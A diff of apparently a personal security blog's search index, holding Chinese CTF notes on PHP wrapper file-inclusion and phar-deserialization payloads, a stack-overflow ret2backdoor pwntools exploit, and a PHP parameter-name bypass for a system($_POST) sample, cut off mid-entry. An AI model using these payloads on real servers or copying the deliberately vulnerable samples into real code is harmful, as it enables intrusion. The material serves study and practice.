-    <content><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
-<span id="more"></span>
-
-<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
-<p>希望自己以后不要再被这个考点麻住了的说</p>
-<p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫）</del></a></p>
-<h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
-<p>支持的种类分为十二种：</p>
-<p>file:// — 访问本地文件系统</p>
-<p>http:// – https:// — 访问 HTTP(s) 网址</p>
-<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
-<p>php:// — 访问各个输入/输出流（I/O streams）</p>
-<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
-<p>data:// — 数据（RFC 2397）</p>
-<p>glob:// — 查找匹配的文件路径模式</p>
-<p>phar:// — PHP 归档</p>
-<p>ssh2:// — Secure Shell 2</p>
-<p>rar:// — RAR</p>
-<p>ogg:// — 音频流</p>
-<p>expect:// — 处理交互式的流</p>
-<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
-<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
-<h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
-<blockquote>
-<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
-<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
-</blockquote>
-<p>常用参数概览</p>
-<blockquote>
-<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
-<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
-<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
-</blockquote>
-<p>常用过滤器</p>
-<blockquote>
-<p>convert.base64-encode &amp; convert.base64-decode</p>
-<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
-</blockquote>
-<h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-
-<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
-<p>试图读取里面的信息</p>
-<p><img src="/images/BUU/202112211700194.png"></p>
-<p>不对啊，我明明往里面写了东西的呢</p>
-<p>让我们用过滤器看看是怎么回事</p>
-<p><img src="/images/BUU/202112211703524.png"></p>
-<p>然后编回来</p>
-<p><img src="/images/BUU/202112211711151.png"></p>
-<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
-<h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote>
-<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
-</blockquote>
-<p>那既然都提到POST了，能不带GET玩嘛~</p>
-<h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>试图搞事</p>
-<p><img src="/images/BUU/202112211942039.png"></p>
-<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
-<p><strong>替 身 觉 醒</strong></p>
-<p><img src="/images/BUU/202112211952241.png"></p>
-<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
-<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
-<p>某些情况下 绕过GET型传参的waf很好用。</p>
-<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
-<h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
-<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
-<p><img src="/images/BUU/202112211522406.png"></p>
-<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
-<p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
-<h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>
-
-<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
-<p><img src="/images/BUU/202112212116212.png"></p>
-<h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
-<p>在周大福里经常作为反序列化考点出现。</p>
-<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
-<h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
-
-<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
-<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
-<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
-<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
-<p><img src="/images/BUU/202112211610188.png"></p>
-<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/BUU/202112211623190.png"></p>
-<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
-<p><strong>一种经典周大福</strong></p>
-<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
-<h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
-<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
-<h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
-<p><img src="/images/BUU/202112212011428.png"></p>
-<h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
-<p><img src="/images/BUU/202112262150620.png"></p>
-<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
-<p><img src="/images/BUU/202112262157376.png"></p>
-<p>此文章发布于2021.12.21，更新于2022.9.16。</p>
-]]></content>
-      <tags>
-        <tag>php-wrappers</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>栈平衡详解</title>
-    <url>/2022/10/07/stack_balance/</url>
-    <content><![CDATA[<p>绕过了强而有力的保护，结果卡在栈平衡，痛失三血，怒写笔记。鉴定为菜。</p>
-<span id="more"></span>
-
-<h1><span id="概念">概念</span></h1><blockquote>
-<p>函数如果要返回父程序，则在堆栈中进行操作的时候，一定要在RET指令之前，将ESP指向函数入栈前的地址。</p>
-<p>每调用一个CALL，就会开辟一个新的栈空间，如果没有栈平衡功能的实现，那么很容易会破坏其它栈里的数据，导致程序崩溃。</p>
-<p>在Ubuntu18以上环境的64位程序，当调用<code>printf</code>或是<code>system</code>时，需要保证RSP &amp; 0xf == 0，即16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。</p>
-</blockquote>
-<h1><span id="示例">示例</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以一个简单的栈溢出程序为例，在<code>Ubuntu 18.04</code>系统上进行64位编译</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; gcc exp.c -o exp -no-pie -fno-stack-protector</span><br></pre></td></tr></table></figure>
-
-<p>为了方便演示关闭了PIE保护和canary。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&gt; checksec --file=exp     </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   64 Symbols	  No	0		1		exp</span><br></pre></td></tr></table></figure>
-
-<p>搓个人畜无害的exp，attach上gdb进行动态调试</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400571</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20221006230718.png"></p>
-<p>可以看到溢出利用是成功的，至此一切正常。继续单步跳过</p>
-<p><img src="/images/20221006231052.png"></p>
-<p>步入<code>system</code>调用后，整个程序就寄在了MOVAPS指令<sup>[1]</sup>，同时抛出错误</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault。</span><br></pre></td></tr></table></figure>
-
-<p>因为MOVAPS指令要求目标操作数是内存操作数时对齐16字节边界，如果没对齐会就会出现分段错误。</p>
-<blockquote>
-<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary or a general-protection exception (#GP) will be generated. </p>
-</blockquote>
-<p>回头看现在栈上的情况</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp   0x7fff001f9818 -&gt; 0x7fff001f9b30 &lt;- 0x0</span><br></pre></td></tr></table></figure>
-
-<p>此时RSP寄存器的值是0x7fff001f9818，并没有对齐16字节，即强行跳转后门函数破坏了栈平衡，需要完善栈溢出的操作。</p>
-<p>一种常见的解决方法是在调用后门函数之前塞个RET指令</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x40054b</span>) + p64(<span class="number">0x400571</span>)</span><br></pre></td></tr></table></figure>
-
-<p>RET指令可以看作等效于POP EIP（实际上没有这个指令<sup>[2]</sup>），也即先弹出栈顶的数据（RSP+8），之后再压栈，将RSP的值对齐16字节完成栈平衡。否则会因为此处意★义★不★明的PUSH造成函数入栈后RSP的值-8。</p>
-<p><img src="/images/20221007230240.png"></p>
-<p>可以看到RSP的值在PUSH后变回了为0x7ffd49459a20。</p>
-<p><img src="/images/20221007232057.png"></p>
-<p>单步跟进到MOVAPS指令，此时RSP寄存器的值为0x7ffd49459680，对齐16字节。</p>
-<p><img src="/images/20221007233355.png"></p>
-<p>本地成功打通。</p>
-<p><img src="/images/20221007233711.png"></p>
-<p>而难以定位RET指令的时候（如开启了PIE保护），既然此处的思想是用POP抵消掉PUSH来保证栈平衡，我们不妨做得更绝一点，要是直接舍弃意★义★不★明的PUSH呢？</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">128</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x400572</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/20221007234640.png"></p>
-<p>可以看到仍然保证了栈平衡。本地成功打通。</p>
-<p><img src="/images/20221007235102.png"></p>
-<h1><span id="外部链接">外部链接</span></h1><p>[1] <a href="https://www.felixcloutier.com/x86/movaps">Move Aligned Packed Single-Precision Floating-Point Values</a></p>
-<p>[2] <a href="https://stackoverflow.com/questions/56676840/is-pop-eip-legal-instruction">Is pop eip legal instruction?</a></p>
-]]></content>
-      <tags>
-        <tag>pwn-stackbalance</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php传参特殊字符替换特性源码简析</title>
-    <url>/2022/10/31/php_carafeat/</url>
-    <content><![CDATA[<p>上课时突然想起一个很久以前遇到过的php特性，估摸着也不算复杂，简单写个源码分析。环境是<code>php-7.4.27</code>。</p>
-<span id="more"></span>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>我们先正常传参<code>whoami</code>，从空白的返回看来似乎并没有按照我们预想的那样执行系统命令。通过动态调试可以发现，传入的参数已不再带有<code>.</code>，而是被替换为了<code>_</code>。</p>
-<p><img src="/images/20221031184604.png"></p>
-<p>定位参数处理的C源码位置，发现在源代码main文件夹下的<code>php_variables.c</code>文件中对传入的参数进行了处理。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span></span><br><span class="line"><span class="keyword">for</span> (p = var; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        *p=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        is_array = <span class="number">1</span>;</span><br><span class="line">        ip = p;</span><br><span class="line">        *p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这段代码将传入参数名中的空格和<code>.</code>全部替换为<code>_</code>，和调试显示的结果一致。</p>
-<p>注意后面紧跟着的判断语句，很明显这是在通过传入的参数名判断我们传入的参数是否是数组类型的数据。遇到参数名中的<code>[</code>后会直接break跳出匹配循环，这将有可能成为绕过的突破点。我们继续往下跟进代码执行流。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        ip++;</span><br><span class="line">        index_s = ip;</span><br><span class="line">        <span class="keyword">if</span> (*ip==<span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            index_s = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ip = <span class="built_in">strchr</span>(ip, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ip) &#123;</span><br><span class="line">                <span class="comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span></span><br><span class="line">                *(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此时<code>is_array</code>被置<code>1</code>，进入<code>if</code>语句，分析这段代码可知参数名中的<code>[</code>将被替换为<code>_</code>，结合上一个代码块中的<code>break</code>，在这之后的<code>.</code>和空格也不会再进行解析替换了。</p>
-<p>所以我们若输入<code>aaa[bbb.cc</code>，则参数名将被解析为<code>aaa_bbb.cc</code>，成功传入正确的参数。</p>
-<p><img src="/images/20221031190650.png"></p>
-<p>经过测试后<code>$_POST</code>传参同理。</p>
-<blockquote>
-<p>Note: 這個部分在php8已經不會發生了<sup>[1]</sup>，因為在<code>*(index_s - 1) = &#39;_&#39;;</code>會再檢查一次是否有不符合的字元:</p>
-<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">*(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">/* PHP variables cannot contain <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> their names, so we replace the characters <span class="keyword">with</span> a <span class="string">&#x27;_&#x27;</span> */</span><br><span class="line"><span class="keyword">for</span> (p = index_s; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span> || *p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        *p = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><del>（谁会在、写代码的时候、传这么奇怪的参数啊！）</del></p>
-<p>[1] <a href="https://github.com/php/php-src/blob/33375e927c2cce8ca353d199a9d7275c60fb41e4/main/php_variables.c#L196-L201">php8参数名解析代码变动</a></p>
-]]></content>
-      <tags>
-        <tag>php-feature</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php74内核源码阅读——开始之前</title>
     <url>/2022/11/01/php74k1/</url>
     <content><![CDATA[<p>《深入理解php内核》笔记。这个系列将会对php7.4.30版本的部分源码进行分析。</p>
@@ -588,20 +264,20 @@
   <entry>
     <title>php74内核源码阅读——变量基本结构</title>
     <url>/2022/11/06/php74k2/</url>
-    <content><![CDATA[<p>几个常见php变量结构体的浅析笔记</p>
+    <content><![CDATA[<p>php变量内部实现分析</p>
 <span id="more"></span>
 
-<h1><span id="前置知识">前置知识</span></h1><p>php的所有变量类型（如数字、字符串、数组）都是用zval结构体来存储的，在Zend/zend_types.h头文件中可以看到定义如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">    zend_value        value;            <span class="comment">/* value */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ZEND_ENDIAN_LOHI_3(</span><br><span class="line">                zend_uchar    type,         <span class="comment">/* active type */</span></span><br><span class="line">                zend_uchar    type_flags,</span><br><span class="line">                <span class="keyword">union</span> &#123;</span><br><span class="line">                    <span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">                &#125; u)</span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u1;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">        <span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">        <span class="type">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">        <span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">    &#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h1><span id="前置知识">前置知识</span></h1><p>php的所有变量类型（如数字、字符串、数组）都是用<code>zval</code>结构体来存储的，在Zend/zend_types.h头文件中可以看到定义如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span>     <span class="title">zval</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">    zend_value        value;            <span class="comment">/* value */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ZEND_ENDIAN_LOHI_3(</span><br><span class="line">                zend_uchar    type,         <span class="comment">/* active type */</span></span><br><span class="line">                zend_uchar    type_flags,</span><br><span class="line">                <span class="keyword">union</span> &#123;</span><br><span class="line">                    <span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">                &#125; u)</span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u1;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">        <span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span 